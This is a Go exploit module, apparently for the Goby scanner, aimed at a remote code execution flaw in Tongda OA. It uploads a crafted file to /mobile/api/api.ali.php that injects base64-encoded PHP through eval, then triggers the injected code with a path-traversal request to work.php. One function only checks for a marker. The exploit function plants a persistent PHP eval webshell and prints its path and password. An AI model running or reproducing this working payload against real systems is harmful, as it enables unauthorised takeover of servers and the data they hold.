package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"regexp"
	"time"
	"encoding/base64"
)

func init() {
	expJson := `{
  "Name": "Tongda OA api.ali.php RCE",
  "Description": "There is PHP command execution in Tongda OA api.ali.php file, which can be written to webshell file to control the server",
  "Product": "Tongda OA",
  "Homepage": "https://www.tongda2000.com",
  "DisclosureDate": "2021-06-05",
  "Author": "PeiQi",
  "GobyQuery": "app=\"TongDa-OA\"",
  "Level": "3",
  "Impact": "<p>Tongda OA</p>",
  "Recommendation": "Update patches in time",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": null,
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "RCE"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "Tongda OA"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Disable": false,
  "Recommandation": "<p>Update</p>"
}`


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    randomStr := goutils.RandomHexString(8)
			uri := "/mobile/api/api.ali.php"
			eval_data := "file_put_contents('../../" + randomStr + ".php','<?php echo \"" + randomStr + "\";unlink(__FILE__);?>');"
			eval_data_base := []byte(eval_data)
			encoded := base64.StdEncoding.EncodeToString(eval_data_base)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae")
			cfg.Data = "--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + randomStr + ".json\"\r\nContent-Type: application/octet-stream\r\n\r\n{\"modular\":\"AllVariable\",\"a\":\"" + encoded + "\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}\r\n--502f67681799b07e4de6b503655f5cae--"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			    if resp.StatusCode == 200 {
			        uri_1 := "/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2106/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E." + randomStr
			        cfg_1 := httpclient.NewGetRequestConfig(uri_1)
        			cfg_1.VerifyTls = false
        			cfg_1.FollowRedirect = false
        			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
                        if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "OK") {
                            uri_2 := "/" + randomStr + ".php"
        			        cfg_2 := httpclient.NewGetRequestConfig(uri_2)
                			cfg_2.VerifyTls = false
                			cfg_2.FollowRedirect = false
                			cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
                			if resp, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
                			    return resp.StatusCode == 200 && strings.Contains(resp.RawBody, randomStr)
                            }
                        }
        			}
        		}
			}    
	
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    randomStr := goutils.RandomHexString(8)
		    randomStr_pass := goutils.RandomHexString(4)
			uri := "/mobile/api/api.ali.php"
			eval_data := "file_put_contents('../../" + randomStr + ".php','<?php @eval($_REQUEST[\"" + randomStr_pass + "\"]);?>');"
			eval_data_base := []byte(eval_data)
			encoded := base64.StdEncoding.EncodeToString(eval_data_base)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae")
			cfg.Data = "--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + randomStr + ".json\"\r\nContent-Type: application/octet-stream\r\n\r\n{\"modular\":\"AllVariable\",\"a\":\"" + encoded + "\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}\r\n--502f67681799b07e4de6b503655f5cae--"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			    if resp.StatusCode == 200 {
			        uri_1 := "/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2106/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E." + randomStr
			        cfg_1 := httpclient.NewGetRequestConfig(uri_1)
        			cfg_1.VerifyTls = false
        			cfg_1.FollowRedirect = false
        			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
        			    if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "OK") {
        			        expResult.Output = "Webshell Addr: /" + randomStr + ".php\r\n" + "Webshell Pass: " + randomStr_pass
        		            expResult.Success = true
        			    }
        			}
			    }
			}
			return expResult
		},
	))
}

